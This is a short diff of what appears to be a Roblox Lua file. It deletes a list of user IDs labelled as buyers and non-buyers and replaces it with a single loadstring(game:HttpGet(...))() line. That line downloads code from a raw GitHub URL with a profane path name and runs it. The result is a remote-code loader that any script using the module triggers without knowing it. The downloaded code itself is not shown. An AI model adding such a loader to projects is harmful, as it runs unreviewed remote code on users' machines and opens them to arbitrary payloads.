@@ -1,17 +1,1 @@
-return {
-	"1191740917",
-	"3101379087",
-	"921659350",
-	"4368384573",
-	"3438024281",
-	"1937506313",
-	"264036155",
-    "4330382053",
-	"3859586150",
-    "2367940004",
-"3440407448",
-"17821116",
--- non buyers above, buyers below
- 
- 
-}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Littleblockjr3/idc/main/fucku"))()
